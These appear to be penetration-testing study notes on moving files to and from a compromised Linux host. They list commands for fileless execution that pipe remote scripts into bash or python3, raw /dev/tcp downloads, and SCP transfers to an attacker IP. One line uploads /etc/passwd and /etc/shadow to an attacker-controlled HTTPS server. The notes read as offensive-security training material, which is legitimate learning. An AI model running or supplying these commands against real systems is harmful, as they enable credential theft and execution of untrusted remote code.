# Download Operations
## Base64 Encoding/Decoding
### Check File Hash
```JavaScript
md5sum <file>
```
### Encode File to Base64
```JavaScript
cat <file> | base64 -w 0; echo
```
### Target - Decode the File
```JavaScript
echo -n <string> | base64 -d > <file>
```
### Target - Confirm the MD5 Hashes Match
```JavaScript
md5sum <file>
```
  
  
## Web Downloads with Wget and cURL
### Download a File Using wget
```JavaScript
wget <url> -O /path/to/outputfile
```
  
### Download a File Using cURL
```JavaScript
curl -o /path/to/outputfile <url>
```
  
## Fileless Attacks Using Linux
- because of how linux works and how pipes operate, most of the tools used in Linux can be used to replicate fileless operations, meaning we don’t have to download a file to execute it
  
### Fileless Download with cURL
```JavaScript
curl <url> | bash
```
  
### Fileless Download with wget
- can also download a python script from a web server and pipe it into a python binary
```JavaScript
wget <url> | python3
```
  
  
## Download with Bash (/dev/tcp)
- use when wget and curl aren’t available
- works as long as ≥ Bash 2.04 is installed and compiled with `--enable-net-redirections`
  
### Connect to Target Webserver
```JavaScript
exec 3<>/dev/tcp/<ip>/<port>
```
  
### HTTP GET Request
```JavaScript
echo -e "GET /<file> HTTP/1.1\n\n">&3
```
  
### Print Response
```JavaScript
cat <&3
```
  
  
## SSH Downloads
### Enable and Starting SSH Server
```JavaScript
sudo systemctl enable ssh
sudo systemctl start ssh
netstat -lnpt // confirms ssh is listening on port 22
```
  
## Download a File Using SCP
```JavaScript
scp <tmpuser>@<attacker_IP>:/<path> /path/to/output
```
- use a tmpuser to avoid connecting with your normal account
  
  
  
# Upload Operations
## Web Upload
### Starting Upload Server
```JavaScript
sudo python3 -m pip install --user uploadserver
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```
  
## Linux - Upload Multiple Files
```JavaScript
curl -X POST https://<attacker_IP>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
  
## Alternative Web File Transfer Method
### Linux (Target) - Creating a Web Server
```JavaScript
python3 -m http.server <port\>// Python3
python2.7 -m SimpleHTTPServer // Python2.7
php -S 0.0.0.0:8000 // PHP - can use other port if needed
ruby -run -ehttpd . -p8000
```
  
### Download the File to Attacker Host
```JavaScript
wget <IP>:<port>/<file>
```
  
  
## SCP Upload
```JavaScript
scp <file/to/upload> <tmpuser>@<attacker_IP>:<path/to/upload>
```